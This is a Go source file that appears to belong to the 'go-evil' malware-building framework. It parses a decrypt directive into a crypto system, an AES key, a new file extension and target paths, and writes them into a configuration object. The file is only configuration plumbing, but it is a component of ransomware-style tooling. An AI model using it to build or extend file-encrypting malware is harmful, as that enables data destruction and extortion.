package decrypt

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/crypto/configuration"
	evil_target "github.com/s9rA16Bf4/go-evil/domains/crypto/target"
	"github.com/s9rA16Bf4/go-evil/utility/structure"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func preface_configuration(value string, data_object *json.Json_t) []string {
	call_history := []string{}

	arr := structure.Create_evil_object(value)

	if arr.Length() != 0 && arr.Length() < 4 {
		notify.Error(fmt.Sprintf("Expected atleast four values, but recieved %d", arr.Length()), "crypt.Decrypt()")

	} else if arr.Length() == 4 {
		crypto_system := arr.Pop_front()
		key := arr.Pop_front() // If this is empty, then we need to generate a key
		new_extension := arr.Pop_front()
		targets := arr.Dump() // Grab all the targets

		// Set the crypto
		call := []string{}

		call = configuration.Set_crypto(crypto_system, data_object)
		call_history = append(call_history, call...)

		// Key handling
		if key != "" { // We got a key to use
			call = configuration.Set_aes_key(key, data_object)
			call_history = append(call_history, call...)
		}

		// Set extension
		call = configuration.Set_extension(new_extension, data_object)
		call_history = append(call_history, call...)

		// Set targets
		for _, target := range targets {
			if target != "" {
				call = evil_target.Add(target, data_object)
				call_history = append(call_history, call...)
			}

		}

	}

	return call_history

}
